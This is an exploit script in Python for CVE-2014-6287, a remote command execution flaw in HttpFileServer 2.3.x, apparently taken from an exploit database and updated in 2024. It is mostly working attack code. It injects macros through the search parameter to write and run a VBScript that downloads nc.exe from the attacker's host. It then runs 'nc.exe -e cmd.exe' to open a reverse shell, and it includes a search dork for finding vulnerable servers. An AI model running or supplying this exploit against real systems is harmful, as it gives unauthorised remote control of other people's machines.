# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#     It's different from classic file sharing because it uses web technology to be more
#     compatible with today's Internet. It also differs from classic web servers because
#     it's very easy to use and runs "right out-of-the box". Access your remote files, over
#     the network. It has been successfully tested with Wine under Linux.

# Usage is: python %s <Target IP address> <Target Port Number> <Local ip where http server listen> <local port for the reverse shell>
# EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
# You may need to run it multiple times for success!

# Updated date: 2024-03-07, zhsh9

import requests
from urllib.parse import quote
import sys

help  = "[-] Something went wrong..!"
help += "[-] Usage is: python %s <Target IP address> <Target Port Number> <Local ip where http server listen> <local port for the reverse shell>".format(sys.argv[0])
help += "[-] Don't forget to have an http server with will serve the nc.exe file like http://local_ip:80/nc.exe"

if len(sys.argv) == 5:
    rhost = sys.argv[1]  # remote IP address
    rport = sys.argv[2]  # remote Port number
    lhost = sys.argv[3]  # local IP address
    lport = sys.argv[4]  # local Port number
else:
    print(help)
    sys.exit(-1)

vbscript   = "C:\Users\Public\script.vbs"
ncdownurl  = "http://"+lhost+"/nc.exe"
ncpathsave = "C:\\Users\\Public\\nc.exe"

exe1 =   "exec|" + "cscript.exe "+vbscript
exe2 =   "exec|" + ncpathsave+" -e cmd.exe " +lhost + " " + lport
save = '''save|'''+vbscript+'''|\
' Create an XMLHTTP object to send HTTP requests
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
' Create an ADODB Stream object to handle file writing operations
dim bStrm: Set bStrm = createobject("Adodb.Stream")
' Use the GET method to open the specified URL, the third parameter set to False means the request is synchronous
xHttp.Open "GET", "'''+ncdownurl+'''", False
' Send the HTTP request
xHttp.Send

' Begin operations on the ADODB stream object with a with statement
with bStrm
    ' Set the stream type to 1, which means binary
    .type = 1 '//binary
    ' Open the stream object
    .open
    ' Write the received HTTP response body (binary content) into the stream
    .write xHttp.responseBody
    ' Save the stream content to a file, the path being "'''+ncpathsave+'''", the second parameter 2 means overwrite mode
    .savetofile "'''+ncpathsave+'''", 2 '//overwrite
' End the with statement
end with
'''

try:
    # create vbs (function: wget http://<IP>:80/nc.exe)
    requests.get("http://" + rhost + ":" + rport + "/?search=%00{.+" + quote(save) + ".}")

    # execute_script: wget http://<IP>:80/nc.exe
    requests.get("http://" + rhost + ":" + rport + "/?search=%00{.+" + quote(exe1) + ".}")

    # nc_run(): nc.exe -e cmd.exe <IP> <Port>
    requests.get("http://" + rhost + ":" + rport + "/?search=%00{.+" + quote(exe2) + ".}")

except:
    print(help)
    sys.exit(-1)
